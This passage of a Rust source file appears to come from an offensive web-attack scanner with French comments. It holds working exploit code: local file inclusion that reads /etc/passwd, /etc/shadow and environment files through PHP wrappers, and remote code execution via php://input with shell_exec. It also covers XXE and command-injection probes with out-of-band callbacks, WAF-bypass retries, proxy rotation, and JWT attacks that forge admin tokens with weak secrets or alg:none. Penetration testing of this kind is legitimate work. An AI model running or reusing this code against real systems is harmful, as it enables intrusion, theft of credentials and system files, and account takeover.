                    remediation: "Valider les chemins de fichiers. Utiliser une liste blanche. Ne jamais construire des chemins depuis des entrées utilisateur.".into(),
                });
                continue;
            }

            // P0.2 — payload filtré : retenter avec un encodage alternatif
            if cfg.waf_bypass && is_waf_blocked(status, &body) {
                if let Some(ev) =
                    tamper_retry(client, base_url, param, &payload, cfg.retries, |b, _| {
                        evidence
                            .split('|')
                            .find(|p| !p.is_empty() && b.contains(p))
                            .map(|p| {
                                format!("Fichier système lu après tamper : pattern '{}' trouvé", p)
                            })
                    })
                    .await
                {
                    println!(
                        "  \x1b[38;5;196m[LFI]\x1b[0m {} param={} → {} (WAF bypass)",
                        base_url, param, payload
                    );
                    vulns.push(WebVuln {
                        vuln_type:   "Path Traversal / Local File Inclusion (LFI)".into(),
                        url:         test_url.clone(),
                        parameter:   param.to_string(),
                        payload:     payload.to_string(),
                        evidence:    ev,
                        severity:    "HIGH".into(),
                        confidence:  0.75,
                        remediation: "Valider les chemins de fichiers. Utiliser une liste blanche. Ne jamais construire des chemins depuis des entrées utilisateur.".into(),
                    });
                    continue;
                }
            }
        }
    }

    vulns
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct LfiExploitation {
    pub param: String,
    pub files_read: Vec<(String, String)>,
    pub wrappers: Vec<String>,
    pub rce_evidence: Vec<String>,
}

pub async fn exploit_lfi(
    base_url: &str,
    params: &[&str],
    cfg: &WebAttackConfig,
) -> Vec<LfiExploitation> {
    let client = build_client(cfg);
    let mut results = Vec::new();

    let b64 = base64::engine::general_purpose::STANDARD;

    let targets: Vec<(&str, &str, &str)> = vec![
        ("/etc/passwd", "Unix users", "root:x:"),
        ("/etc/shadow", "Unix shadow", "root:"),
        ("/proc/self/environ", "Process env", "PATH="),
        ("/proc/self/cmdline", "Process cmdline", ""),
        ("/etc/hosts", "Hosts file", "localhost"),
        ("/etc/apache2/apache2.conf", "Apache config", "# Global"),
        ("/var/log/apache2/access.log", "Apache access", "GET /"),
        ("/var/log/nginx/access.log", "Nginx access", "GET /"),
        ("C:/Windows/win.ini", "Windows win.ini", "[fonts]"),
        (
            "C:/Windows/System32/drivers/etc/hosts",
            "Win hosts",
            "localhost",
        ),
        ("../../../../../../etc/passwd", "Traversal Unix", "root:x:"),
        (
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "Traversal Win",
            "[fonts]",
        ),
    ];

    for param in params {
        let mut explo = LfiExploitation {
            param: param.to_string(),
            ..Default::default()
        };

        // 1. php://filter base64 (décode le contenu retourné)
        for (file, label, must_match) in &targets {
            let wrapper = format!("php://filter/convert.base64-encode/resource={}", file);
            let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(&wrapper));
            if let Some((_, body, _)) = http_get(&client, &test_url, cfg.retries).await {
                let trimmed = body.trim();
                if trimmed.len() > 20
                    && trimmed
                        .chars()
                        .all(|c| c.is_ascii_alphanumeric() || "+/=".contains(c))
                {
                    if let Ok(decoded_bytes) = b64.decode(trimmed) {
                        if let Ok(decoded) = String::from_utf8(decoded_bytes) {
                            if must_match.is_empty() || decoded.contains(must_match) {
                                // OPSEC : le contenu est à la fois imprimé et
                                // persisté dans le rapport → masquer les
                                // secrets avant toute sortie.
                                let preview = redact_file_secrets(&decoded)
                                    .chars()
                                    .take(300)
                                    .collect::<String>();
                                println!("  \x1b[38;5;196m[LFI-READ]\x1b[0m param={} file={} via php://filter ({} bytes)",
                                         param, label, preview.len());
                                println!("  \x1b[90m{}\x1b[0m", preview.replace('\n', "\n    "));
                                explo.files_read.push((file.to_string(), preview));
                                if !explo.wrappers.contains(&"php://filter".into()) {
                                    explo.wrappers.push("php://filter".into());
                                }
                            }
                        }
                    }
                }
            }
            tokio::time::sleep(Duration::from_millis(80)).await;
        }

        // 2. file:// wrapper
        let file_wrapper = "file:///etc/passwd";
        let test_url = format!(
            "{}?{}={}",
            base_url,
            param,
            urlencoding::encode(file_wrapper)
        );
        if let Some((_, body, _)) = http_get(&client, &test_url, cfg.retries).await {
            if body.contains("root:x:0:0") {
                let preview = redact_file_secrets(&body)
                    .chars()
                    .take(300)
                    .collect::<String>();
                println!(
                    "  \x1b[38;5;196m[LFI-READ]\x1b[0m param={} wrapper=file:// /etc/passwd",
                    param
                );
                explo
                    .files_read
                    .push(("file:///etc/passwd".into(), preview));
                explo.wrappers.push("file://".into());
            }
        }

        // 3. data:// wrapper RCE ?
        let data_wrapper = "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==";
        let test_url = format!(
            "{}?{}={}",
            base_url,
            param,
            urlencoding::encode(data_wrapper)
        );
        if let Some((_, body, _)) = http_get(&client, &test_url, cfg.retries).await {
            if body.contains("phpinfo()") || body.contains("PHP Version") {
                println!("  \x1b[38;5;196m[LFI-RCE]\x1b[0m param={} wrapper=data:// PHP excuté (phpinfo)", param);
                explo
                    .rce_evidence
                    .push("data:// wrapper RCE → phpinfo".into());
                explo.wrappers.push("data://".into());
            }
        }

        // 4. expect:// wrapper RCE
        let expect_wrapper = "expect://id";
        let test_url = format!(
            "{}?{}={}",
            base_url,
            param,
            urlencoding::encode(expect_wrapper)
        );
        if let Some((_, body, _)) = http_get(&client, &test_url, cfg.retries).await {
            if body.contains("uid=") || body.contains("gid=") {
                println!(
                    "  \x1b[38;5;196m[LFI-RCE]\x1b[0m param={} wrapper=expect:// (uid= détecté)",
                    param
                );
                let preview = body.chars().take(200).collect::<String>();
                explo
                    .rce_evidence
                    .push(format!("expect://id → {}", preview));
                explo.wrappers.push("expect://".into());
            }
        }

        // 5. php://input POST RCE (corps PHP direct)
        let php_input = "php://input";
        let test_url = format!("{}?{}={}", base_url, param, php_input);
        let php_code = "<?php echo 'NRTG_LFI_RCE_CHECK:'.shell_exec('id 2>&1').':END_CHECK'; ?>";
        if let Some((_, body, _)) =
            http_post_raw(&client, &test_url, php_code, None, cfg.retries).await
        {
            if body.contains("uid=") || body.contains("NRTG_LFI_RCE_CHECK") {
                println!("  \x1b[38;5;196m[LFI-RCE]\x1b[0m param={} via php://input + POST PHP (id exécuté)", param);
                if let Some(start) = body.find("NRTG_LFI_RCE_CHECK:") {
                    if let Some(end) = body[start..].find(":END_CHECK") {
                        let id_out = &body[start + 18..start + end];
                        println!("    id output: {}", id_out);
                        explo
                            .rce_evidence
                            .push(format!("php://input POST RCE → {}", id_out));
                    }
                }
                explo.wrappers.push("php://input".into());
            }
        }

        if !explo.files_read.is_empty()
            || !explo.wrappers.is_empty()
            || !explo.rce_evidence.is_empty()
        {
            results.push(explo);
        }
    }

    results
}

// ─────────────────────────────────────────────────────────────────────────────
// 5. XXE Scanner
// ─────────────────────────────────────────────────────────────────────────────

pub async fn scan_xxe(base_url: &str, cfg: &WebAttackConfig) -> Vec<WebVuln> {
    let client = build_client(cfg);
    let mut vulns = Vec::new();

    // Token OOB unique — confirme un XXE aveugle via la résolution du DTD distant.
    let token = oob_token(cfg);

    for (payload, evidence) in xxe_payloads(cfg.ssrf_callback.as_deref(), &token, &cfg.external) {
        // Essayer les endpoints qui acceptent du XML
        for content_type in &["application/xml", "text/xml", "application/soap+xml"] {
            if let Some((_, body, _)) =
                http_post_raw(&client, base_url, &payload, Some(content_type), cfg.retries).await
            {
                for pattern in evidence.split('|') {
                    if !pattern.is_empty() && body.contains(pattern) {
                        println!(
                            "  \x1b[38;5;196m[XXE]\x1b[0m {} content-type={}",
                            base_url, content_type
                        );
                        vulns.push(WebVuln {
                            vuln_type:   "XML External Entity (XXE) Injection".into(),
                            url:         base_url.to_string(),
                            parameter:   format!("XML body ({})", content_type),
                            payload:     payload.chars().take(100).collect::<String>(),
                            evidence:    format!("Fichier lu via XXE : '{}' trouvé", pattern),
                            severity:    "CRITICAL".into(),
                            confidence:  0.95,
                            remediation: "Désactiver le traitement des entités externes XML. Utiliser des parseurs sécurisés. Valider les entrées XML via un schéma.".into(),
                        });
                        break;
                    }
                }
            }
        }
    }

    // OOB — XXE aveugle confirmé par le callback (DTD externe résolu).
    if vulns.is_empty() && !token.is_empty() && crate::oob::OobListener::hit(&token) {
        println!(
            "  \x1b[38;5;196m[XXE OOB]\x1b[0m {} → callback reçu",
            base_url
        );
        vulns.push(WebVuln {
            vuln_type:   "XML External Entity (XXE, aveugle)".into(),
            url:         base_url.to_string(),
            parameter:   "XML body (OOB)".into(),
            payload:     format!("{} (OOB token)", cfg.ssrf_callback.as_deref().unwrap_or("")),
            evidence:    "Callback OOB reçu sur l'écouteur intégré — XXE aveugle confirmé".into(),
            severity:    "CRITICAL".into(),
            confidence:  0.99,
            remediation: "Désactiver le traitement des entités externes XML. Utiliser des parseurs sécurisés. Valider les entrées XML via un schéma.".into(),
        });
    }

    vulns
}

// ─────────────────────────────────────────────────────────────────────────────
// 6. Command Injection
// ─────────────────────────────────────────────────────────────────────────────

pub async fn scan_cmd_injection(
    base_url: &str,
    params: &[&str],
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    // P0.1 — un paramètre par tâche, concurrence bornée.
    // P1.3 — un client par tâche ⇒ rotation de proxy (IP distincte par paramètre).
    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().map(|p| p.to_string()))
        .map(|param| {
            let client = build_client(cfg);
            async move { probe_cmdi_param(&client, base_url, &param, cfg).await }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

/// Teste un paramètre pour injection de commande OS (time-based + evidence).
async fn probe_cmdi_param(
    client: &Client,
    base_url: &str,
    param: &str,
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    let mut vulns = Vec::new();

    // Token OOB unique — confirme une command injection aveugle (callback curl/wget).
    let token = oob_token(cfg);

    for (payload, evidence) in
        cmd_injection_payloads(cfg.ssrf_callback.as_deref(), &token, &cfg.external)
    {
        let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(&payload));

        // OPSEC/robustesse : les payloads `; sleep N` sont des sondes time-based
        // → un seul tir, jamais de retry (la latence mesurée ferait foi).
        let attempts = if payload.contains("sleep") {
            1
        } else {
            cfg.retries
        };

        if let Some((status, body, elapsed)) = http_get(client, &test_url, attempts).await {
            let body_lower = body.to_lowercase();

            // Time-based — P0.3 : confirmer avant de retenir (un délai isolé = faux positif)
            if payload.contains("sleep 2") && elapsed >= 1800 {
                if !confirm_time_based(client, base_url, param, &payload, 3, 1800).await {
                    println!(
                        "  \x1b[33m[CMDi]\x1b[0m Time-based rejeté (non reproductible) {} param={}",
                        base_url, param
                    );
                    continue;
                }
                println!(
                    "  \x1b[38;5;196m[CMDi TIME]\x1b[0m {} param={}",
                    base_url, param
                );
                vulns.push(WebVuln {
                    vuln_type:   "Command Injection (Time-Based)".into(),
                    url:         test_url.clone(),
                    parameter:   param.to_string(),
                    payload:     payload.to_string(),
                    evidence:    format!("Délai sleep confirmé sur 3 échantillons ({}ms)", elapsed),
                    severity:    "CRITICAL".into(),
                    confidence:  0.80,
                    remediation: "Ne jamais passer des entrées utilisateur à shell_exec/system/exec. Utiliser des APIs natives au lieu de commandes système.".into(),
                });
                break;
            }

            // Evidence-based
            let mut hit = None;
            for pattern in evidence.split('|') {
                if !pattern.is_empty() && body_lower.contains(pattern) {
                    hit = Some(pattern.to_string());
                    break;
                }
            }
            if let Some(pattern) = hit {
                println!("  \x1b[38;5;196m[CMDi]\x1b[0m {} param={}", base_url, param);
                vulns.push(WebVuln {
                    vuln_type:   "OS Command Injection".into(),
                    url:         test_url.clone(),
                    parameter:   param.to_string(),
                    payload:     payload.to_string(),
                    evidence:    format!("Sortie de commande OS dans la réponse: '{}'", pattern),
                    severity:    "CRITICAL".into(),
                    confidence:  0.92,
                    remediation: "Valider/whitelister les entrées. Utiliser escapeshellarg(). Éviter les fonctions système.".into(),
                });
                break;
            }

            // P0.2 — payload filtré : retenter avec un encodage alternatif
            if cfg.waf_bypass && is_waf_blocked(status, &body) {
                if let Some(ev) =
                    tamper_retry(client, base_url, param, &payload, cfg.retries, |b, _| {
                        let bl = b.to_lowercase();
                        evidence
                            .split('|')
                            .find(|p| !p.is_empty() && bl.contains(p))
                            .map(|p| format!("Sortie de commande OS après tamper: '{}'", p))
                    })
                    .await
                {
                    println!(
                        "  \x1b[38;5;196m[CMDi]\x1b[0m {} param={} (WAF bypass)",
                        base_url, param
                    );
                    vulns.push(WebVuln {
                        vuln_type:   "OS Command Injection".into(),
                        url:         test_url.clone(),
                        parameter:   param.to_string(),
                        payload:     payload.to_string(),
                        evidence:    ev,
                        severity:    "CRITICAL".into(),
                        confidence:  0.75,
                        remediation: "Valider/whitelister les entrées. Utiliser escapeshellarg(). Éviter les fonctions système.".into(),
                    });
                    break;
                }
            }
        }
    }

    // OOB — command injection aveugle confirmée par le callback (curl/wget exécuté).
    if vulns.is_empty() && !token.is_empty() && crate::oob::OobListener::hit(&token) {
        println!(
            "  \x1b[38;5;196m[CMDi OOB]\x1b[0m {} param={} → callback reçu",
            base_url, param
        );
        vulns.push(WebVuln {
            vuln_type:   "OS Command Injection (aveugle)".into(),
            url:         base_url.to_string(),
            parameter:   param.to_string(),
            payload:     format!("{} (OOB token)", cfg.ssrf_callback.as_deref().unwrap_or("")),
            evidence:    "Callback OOB reçu sur l'écouteur intégré — command injection aveugle confirmée".into(),
            severity:    "CRITICAL".into(),
            confidence:  0.99,
            remediation: "Valider/whitelister les entrées. Utiliser escapeshellarg(). Éviter les fonctions système.".into(),
        });
    }

    vulns
}

// ─────────────────────────────────────────────────────────────────────────────
// 7. JWT Attack
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JwtAnalysis {
    pub algorithm: String,
    pub header: serde_json::Value,
    pub payload: serde_json::Value,
    pub vulns: Vec<String>,
    pub forged_tokens: Vec<(String, String)>, // (technique, token)
}

pub fn analyze_jwt(token: &str) -> Option<JwtAnalysis> {
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 {
        return None;
    }

    let decode = |s: &str| -> Option<serde_json::Value> {
        let padded = match s.len() % 4 {
            2 => format!("{}==", s),
            3 => format!("{}=", s),
            _ => s.to_string(),
        };
        base64::engine::general_purpose::URL_SAFE
            .decode(&padded)
            .ok()
            .and_then(|b| serde_json::from_slice(&b).ok())
    };

    let header = decode(parts[0])?;
    let payload = decode(parts[1])?;

    let algorithm = header["alg"].as_str().unwrap_or("?").to_string();
    let mut vulns = Vec::new();
    let mut forged = Vec::new();

    // Attaque 1 : alg=none (désactiver la vérification)
    if algorithm != "none" {
        let none_header = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(r#"{"alg":"none","typ":"JWT"}"#.as_bytes());
        let none_payload = parts[1];
        let none_token = format!("{}{}{}{}.", none_header, ".", none_payload, ".");
        forged.push(("alg:none".to_string(), none_token));
        vulns
            .push("Tester alg:none — certains serveurs acceptent des tokens sans signature".into());
    }

    // Attaque 2 : RS256 → HS256 confusion (si algorithme asymétrique)
    if algorithm == "RS256" || algorithm == "ES256" {
        vulns.push(format!(
            "{} → HS256 confusion possible — utiliser la clé publique comme secret HMAC",
            algorithm
        ));
    }

    // Attaque 3 : vérifier les claims sensibles
    if let Some(exp) = payload["exp"].as_i64() {
        let now = chrono::Utc::now().timestamp();
        if exp < now {
            vulns.push(format!(
                "Token expiré depuis {} secondes — vérifier si le serveur valide exp",
                now - exp
            ));
        }
    } else {
        vulns.push("Pas de claim 'exp' — token sans expiration".into());
    }

    if payload["iss"].is_null() {
        vulns.push("Pas de claim 'iss' — pas de validation d'émetteur".into());
    }

    // Attaque 4 : weak secret bruteforce (si HS256/HS384/HS512)
    if algorithm.starts_with("HS") {
        let weak_secrets = [
            "secret", "password", "123456", "jwt", "key", "test", "admin", "",
        ];
        for secret in &weak_secrets {
            // Recalculer la signature HMAC pour vérifier
            if verify_jwt_hmac(parts[0], parts[1], parts[2], secret, &algorithm) {
                vulns.push(format!(
                    "SECRET FAIBLE TROUVÉ : '{}' — token forgeable",
                    secret
                ));
                // Forger un token admin
                if let Some(forged_token) = forge_jwt_admin(parts[0], &payload, secret, &algorithm)
                {
                    forged.push((format!("weak_secret:{}", secret), forged_token));
                }
                break;
            }
        }

        if vulns.is_empty() {
            vulns.push(format!(
                "JWT {} — tester avec : hashcat -m 16500 {} rockyou.txt",
                algorithm, token
            ));
        }
    }

    Some(JwtAnalysis {
        algorithm,
        header,
        payload,
        vulns,
        forged_tokens: forged,
    })
}

fn verify_jwt_hmac(h: &str, p: &str, s: &str, secret: &str, alg: &str) -> bool {
    use hmac::{Hmac, Mac};
    use sha2::{Sha256, Sha384, Sha512};

    let msg = format!("{}.{}", h, p);
    let expected = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(s)
        .unwrap_or_default();

    let computed: Vec<u8> = match alg {
        "HS256" => {
            let mut mac = match Hmac::<Sha256>::new_from_slice(secret.as_bytes()) {
                Ok(m) => m,
                Err(_) => return false,
            };
            mac.update(msg.as_bytes());
            mac.finalize().into_bytes().to_vec()
        }
        "HS384" => {
            let mut mac = match Hmac::<Sha384>::new_from_slice(secret.as_bytes()) {
                Ok(m) => m,
                Err(_) => return false,
            };
            mac.update(msg.as_bytes());
            mac.finalize().into_bytes().to_vec()
        }
        "HS512" => {
            let mut mac = match Hmac::<Sha512>::new_from_slice(secret.as_bytes()) {
                Ok(m) => m,
                Err(_) => return false,
            };
            mac.update(msg.as_bytes());
            mac.finalize().into_bytes().to_vec()
        }
        _ => return false,
    };

    computed == expected
}

fn forge_jwt_admin(
    header_b64: &str,
    original_payload: &serde_json::Value,
    secret: &str,
    alg: &str,
) -> Option<String> {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    let mut new_payload = original_payload.clone();
    if let Some(obj) = new_payload.as_object_mut() {
        obj.insert("role".into(), serde_json::json!("admin"));
        obj.insert("admin".into(), serde_json::json!(true));
        obj.insert("sub".into(), serde_json::json!("admin"));
        obj.insert(
            "exp".into(),
            serde_json::json!(chrono::Utc::now().timestamp() + 86400),
        );
    }

    let payload_json = serde_json::to_string(&new_payload).ok()?;
    let payload_b64 =
        base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(payload_json.as_bytes());
    let signing_input = format!("{}.{}", header_b64, payload_b64);

    let sig = match alg {
        "HS256" | "HS384" | "HS512" => {
            let mut mac = Hmac::<Sha256>::new_from_slice(secret.as_bytes()).ok()?;
            mac.update(signing_input.as_bytes());
            base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(mac.finalize().into_bytes())
        }
        _ => return None,
    };

    Some(format!("{}.{}.{}", header_b64, payload_b64, sig))
}

// ─────────────────────────────────────────────────────────────────────────────
// 8. Open Redirect
// ─────────────────────────────────────────────────────────────────────────────

pub async fn scan_open_redirect(
    base_url: &str,
    params: &[&str],
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    // Policy::none() obligatoire ici pour observer le 3xx sans le suivre.
    // L'authentification de l'opérateur est conservée (P0.4).
    let client = reqwest::Client::builder()
        .timeout(cfg.timeout)
        .redirect(reqwest::redirect::Policy::none())
        .user_agent(effective_user_agent(cfg))
        .default_headers(cfg.auth.to_headers())
        .build()
        .unwrap_or_default();

    // OPSEC : domaine réservé IANA (RFC 2606) — jamais de domaine réel dans le code.
    let redirect_targets = [
        "https://example.org",
        "//example.org",
        "\\\\example.org",
        "https:example.org",
    ];

    // P0.1 — un paramètre par tâche, concurrence bornée.
    let retries = cfg.retries;
    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().map(|p| p.to_string()))
        .map(|param| {
            let client = client.clone();
            async move {
                let mut vulns = Vec::new();
                for target in &redirect_targets {
                    let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(target));

                    // P1.1 : retry/backoff + en-têtes conservés (nécessaires pour lire `Location`)
                    if let Some((status, hmap, _)) =
                        http_get_headers(&client, &test_url, &[], retries).await
                    {
                        if (300..=399).contains(&status) {
                            let location = hmap
                                .get("location")
                                .and_then(|v| v.to_str().ok())
                                .unwrap_or("");

                            if location.contains("example.org") {
                                println!("  \x1b[38;5;196m[OPEN-REDIRECT]\x1b[0m {} param={}", base_url, param);
                                vulns.push(WebVuln {
                                    vuln_type:   "Open Redirect".into(),
                                    url:         test_url,
                                    parameter:   param.clone(),
                                    payload:     target.to_string(),
                                    evidence:    format!("Redirection vers {} (HTTP {})", location, status),
                                    severity:    "MEDIUM".into(),
                                    confidence:  0.95,
                                    remediation: "Valider les URLs de redirection contre une liste blanche de domaines autorisés.".into(),
                                });
                                break;
                            }
                        }
                    }
                }
                vulns
            }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

// ─────────────────────────────────────────────────────────────────────────────
// 8bis. CRLF / Response Splitting
// ─────────────────────────────────────────────────────────────────────────────

/// Nom d'en-tête canari injecté par les sondes CRLF : si le serveur le renvoie
/// dans sa réponse, c'est que le couple CR/LF a été accepté comme séparateur
/// d'en-tête — la seule preuve non ambiguë d'une injection CRLF.
const CRLF_CANARY: &str = "X-Nrtg-Crlf";

fn crlf_payloads(ext: &ExternalPayloads) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = vec![
        (
            "CRLF brut".to_string(),
            format!("%0d%0a{}%3a+injected", CRLF_CANARY),
        ),
        (
            "LF seul".to_string(),
            format!("%0a{}%3a+injected", CRLF_CANARY),
        ),
        // Encodage UTF-8 surlong de CR/LF : certains filtres rejettent %0d%0a
        // mais laissent passer la séquence surlongue, que le serveur normalise.
        (
            "UTF-8 surlong".to_string(),
            format!("%E5%98%8A%E5%98%8D{}%3a+injected", CRLF_CANARY),
        ),
        // Double saut de ligne : sépare les en-têtes du corps (response splitting).
        (
            "Response splitting".to_string(),
            "%0d%0a%0d%0a<nrtg-split>1</nrtg-split>".to_string(),
        ),
    ];
    // Payloads externes (`ext.crlf`) : colonne 1 = payload, colonne 2 = libellé.
    out.extend(ext.crlf.iter().map(|(p, l)| {
        let label = if l.is_empty() {
            "externe".to_string()
        } else {
            l.clone()
        };
        (label, p.clone())
    }));
    out
}

/// CRLF injection / HTTP response splitting. La détection est binaire :
/// l'en-tête canari apparaît dans la réponse, ou le corps a été scindé.
pub async fn scan_crlf(base_url: &str, params: &[&str], cfg: &WebAttackConfig) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().map(|p| p.to_string()))
        .map(|param| {
            let client = build_client(cfg);
            async move {
                let mut vulns = Vec::new();
                for (label, payload) in crlf_payloads(&cfg.external) {
                    let test_url = format!("{}?{}={}", base_url, param, payload);
                    let Some((status, hmap, body)) =
                        http_get_headers(&client, &test_url, &[], cfg.retries).await
                    else { continue };

                    if hmap.contains_key("x-nrtg-crlf") {
                        println!("  \x1b[38;5;196m[CRLF]\x1b[0m {} param={} ({})", base_url, param, label);
                        vulns.push(WebVuln {
                            vuln_type:   "CRLF Injection".into(),
                            url:         test_url,
                            parameter:   param.clone(),
                            payload:     payload.clone(),
                            evidence:    format!("En-tête `{}` injecté dans la réponse (HTTP {})", CRLF_CANARY, status),
                            severity:    "HIGH".into(),
                            confidence:  0.92,
                            remediation: "Rejeter les caractères CR/LF dans toute donnée concaténée à un en-tête (RFC 7230 §3.2.4).".into(),
                        });
                        break;
                    }
                    if body.contains("<nrtg-split>") {
                        println!("  \x1b[38;5;196m[CRLF]\x1b[0m {} param={} (response splitting)", base_url, param);
                        vulns.push(WebVuln {
                            vuln_type:   "HTTP Response Splitting".into(),
                            url:         test_url,
                            parameter:   param.clone(),
                            payload:     payload.clone(),
                            evidence:    format!("Corps de réponse scindé — marqueur injecté (HTTP {})", status),
                            severity:    "HIGH".into(),
                            confidence:  0.85,
                            remediation: "Assainir les entrées avant insertion dans les en-têtes ; utiliser l'API d'en-têtes du framework (échappement automatique).".into(),
                        });
                        break;
                    }
                }
                vulns
            }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

// ─────────────────────────────────────────────────────────────────────────────
// 8ter. CSRF
// ─────────────────────────────────────────────────────────────────────────────

fn is_csrf_token_name(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    [
        "csrf",
        "xsrf",
        "authenticity_token",
        "nonce",
        "_token",
        "anti-forgery",
        "requestverificationtoken",
        "csrfmiddlewaretoken",
    ]
    .iter()
    .any(|k| n.contains(k))
}

/// CSRF — analyse déterministe des formulaires mutateurs découverts par le
/// spider. Un formulaire POST sans champ jeton est exploitable, sauf si les
/// cookies de session portent `SameSite=Lax|Strict` (le navigateur bloque alors
/// l'envoi cross-site et le risque retombe). Le verdict n'est donc pas binaire :
/// `SameSite` atténue ⇒ sévérité abaissée, jamais de « CRITICAL ».
pub async fn scan_csrf(base_url: &str, forms: &[HtmlForm], cfg: &WebAttackConfig) -> Vec<WebVuln> {
    let mut vulns = Vec::new();
    if forms.is_empty() {
        return vulns;
    }

    let client = build_client(cfg);
    let mut same_site_protected = false;
    if let Some((_, hmap, _)) = http_get_headers(&client, base_url, &[], cfg.retries).await {
        for v in hmap.get_all("set-cookie") {
            if let Ok(s) = v.to_str() {
                let l = s.to_ascii_lowercase();
                if l.contains("samesite=lax") || l.contains("samesite=strict") {
                    same_site_protected = true;
                }
            }
        }
    }

    for form in forms {
        let method = form.method.to_ascii_uppercase();
        // Seuls les verbes mutants sont concernés : un GET est idempotent.
        if !matches!(method.as_str(), "POST" | "PUT" | "PATCH" | "DELETE") {
            continue;
        }
        if form.inputs.iter().any(|i| is_csrf_token_name(i)) {
            continue;
        }

        let action = if form.action.trim().is_empty() {
            base_url.to_string()
        } else {
            form.action.clone()
        };
        println!(
            "  \x1b[38;5;214m[CSRF]\x1b[0m {} {} (sans jeton)",
            method, action
        );
        vulns.push(WebVuln {
            vuln_type: if same_site_protected {
                "CSRF — formulaire sans jeton (atténué par SameSite)".into()
            } else {
                "CSRF — formulaire mutateur sans jeton anti-CSRF".into()
            },
            url:         action,
            parameter:   format!("{} · {} champ(s)", method, form.inputs.len()),
            payload:     "requête cross-origin forgée avec la session de la victime".into(),
            evidence:    format!(
                "Formulaire {} vers `{}` sans champ jeton anti-CSRF{}",
                method, form.action,
                if same_site_protected { " (cookies SameSite=Lax/Strict)" } else { "" }
            ),
            severity:    if same_site_protected { "LOW" } else { "MEDIUM" }.into(),
            confidence:  if same_site_protected { 0.4 } else { 0.75 },
            remediation: "Exiger un jeton anti-CSRF (synchronizer token ou double-submit) sur toute action mutante et poser SameSite=Lax/Strict sur les cookies de session.".into(),
        });
    }

    dedup_vulns(vulns)
}

// ─────────────────────────────────────────────────────────────────────────────
// 8quater. IDOR / contrôle d'accès manquant
// ─────────────────────────────────────────────────────────────────────────────

/// Similarité grossière de deux corps : 1.0 si identiques, sinon rapport des
/// longueurs (proxy « même page servie »). Un diff complet serait plus fin mais
/// disproportionné pour un simple différentiel authentifié/anon.
fn body_similarity(a: &str, b: &str) -> f64 {
    if a == b {
        return 1.0;
    }
    if a.is_empty() || b.is_empty() {
        return 0.0;
    }
    let (lo, hi) = (a.len().min(b.len()), a.len().max(b.len()));
    lo as f64 / hi as f64
}

/// Garde-fou anti-faux-positif : une page qui contient un champ mot de passe et
/// des libellés de connexion est une page d'authentification, pas la ressource
/// demandée — un différentiel « authentifié = anonyme » y serait un leurre.
fn looks_like_login(body: &str) -> bool {
    let l = body.to_ascii_lowercase();
    let has_pw = l.contains("type=\"password\"")
        || l.contains("type='password'")
        || l.contains("name=\"password\"")
        || l.contains("name='password'");
    let has_login = l.contains("login")
        || l.contains("sign in")
        || l.contains("connexion")
        || l.contains("log in");
    has_pw && has_login
}

/// Client identique à `build_client` mais SANS le contexte d'authentification :
/// sert de référence « anonyme » pour le différentiel de contrôle d'accès.
fn build_client_no_auth(cfg: &WebAttackConfig) -> Client {
    let mut builder = reqwest::Client::builder()
        .timeout(cfg.timeout)
        .danger_accept_invalid_certs(true)
        .user_agent(effective_user_agent(cfg))
        .redirect(if cfg.follow_redirects {
            reqwest::redirect::Policy::limited(5)
        } else {
            reqwest::redirect::Policy::none()
        });

    let n = cfg.proxies.len();
    if n > 0 {
        let start = PROXY_CURSOR.fetch_add(1, Ordering::Relaxed);
        for off in 0..n {
            let url = &cfg.proxies[(start + off) % n];
            if let Ok(p) = reqwest::Proxy::all(url) {
                builder = builder.proxy(p);
                break;
            }
        }
    }

    builder.build().unwrap_or_default()
}

/// IDOR / contrôle d'accès manquant — différentiel authentifié vs anonyme.
///
/// GATING STRICT : sans contexte d'authentification opérateur (`--cookie` /
/// `--bearer`), aucun différentiel n'est possible. On ne conclut donc jamais à
/// partir d'une seule identité — le scanner retourne vide et `full_web_scan`
/// affiche la raison.
pub async fn scan_idor(base_url: &str, params: &[&str], cfg: &WebAttackConfig) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    if cfg.auth.is_empty() {
        return Vec::new();
    }

    // Paramètres adressant une ressource par identifiant (+ `--web-payloads params=…`).
    let id_params: Vec<String> = [
        "id",
        "user",
        "user_id",
        "userid",
        "uid",
        "account",
        "account_id",
        "order",
        "order_id",
        "invoice",
        "doc",
        "document",
        "document_id",
        "file",
        "file_id",
        "pid",
        "aid",
        "nid",
        "no",
        "num",
        "number",
        "ref",
        "reference",
        "key",
        "profile",
        "customer",
        "project",
        "slug",
    ]
    .into_iter()
    .map(|s| s.to_ascii_lowercase())
    .chain(cfg.external.params.iter().map(|s| s.to_ascii_lowercase()))
    .collect();
    let candidates: Vec<String> = params
        .iter()
        .filter(|p| id_params.contains(&p.to_ascii_lowercase()))
        .map(|p| p.to_string())
        .collect();
    if candidates.is_empty() {
        return Vec::new();
    }

